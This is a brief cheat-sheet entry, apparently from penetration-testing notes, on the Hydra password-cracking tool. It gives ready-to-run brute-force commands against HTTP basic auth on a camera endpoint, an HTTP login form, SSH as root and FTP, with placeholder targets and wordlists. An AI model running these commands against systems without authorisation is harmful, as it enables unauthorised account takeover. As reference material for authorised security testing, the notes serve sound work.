# Hydra

1. Tool to crack passwords of various web service and also system services/protocols such as SSH and FTP.
2. Usage:
   1. hydra -l admin -P 1000\_common\_passwords.txt -s 8090 -f 192.168.1.4 http-get /get\_camera\_params.cgi \[basic auth bruteforce]
   2. hydra -l username -P wordlist.txt VICTIMIP http-post-form "/URLPATH:username=^USER^\&password=^PASS^:login error" -V
   3. hydra -l root -P wordlist.txt -t 6 ssh://ip
   4. hydra -l user -P wordlist.txt ftp://ip
3. Reference:
   1. [https://en.kali.tools/?p=220](https://en.kali.tools/?p=220)
